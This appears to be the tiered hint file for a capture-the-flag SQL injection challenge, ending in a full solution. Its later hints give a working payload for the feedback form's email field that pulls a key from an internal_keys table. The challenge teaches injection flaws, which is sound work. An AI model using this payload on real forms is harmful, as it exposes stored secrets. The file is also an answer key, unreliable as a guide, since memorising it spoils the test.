hints.title: Nudge
hints.content: Your feedback is stored in the database and shown back to you. What if the values being inserted weren't just plain text?

hints.title: Direction
hints.content: The INSERT statement looks like: INSERT INTO feedback (name, email, message) VALUES ('...', '...', '...'). You can break out of a value and inject additional data.

hints.title: Approach
hints.content: In the email field, close the current value and inject a subquery. For example: test@x.com', (SELECT 'injected'))-- This closes email, sets message to 'injected', and comments out the rest.

hints.title: Near-solution
hints.content: Use the email field: test@x.com', (SELECT key_value FROM internal_keys LIMIT 1))-- This will insert the flag as the message field, which gets displayed on the confirmation page.

hints.title: Solution
hints.content: Submit the feedback form with: Name: anything, Email: test@x.com', (SELECT key_value FROM internal_keys LIMIT 1))-- , Message: anything. The INSERT becomes: INSERT INTO feedback (name, email, message) VALUES ('anything', 'test@x.com', (SELECT key_value FROM internal_keys LIMIT 1))--', '...'). The flag appears as the message on the thank-you page.
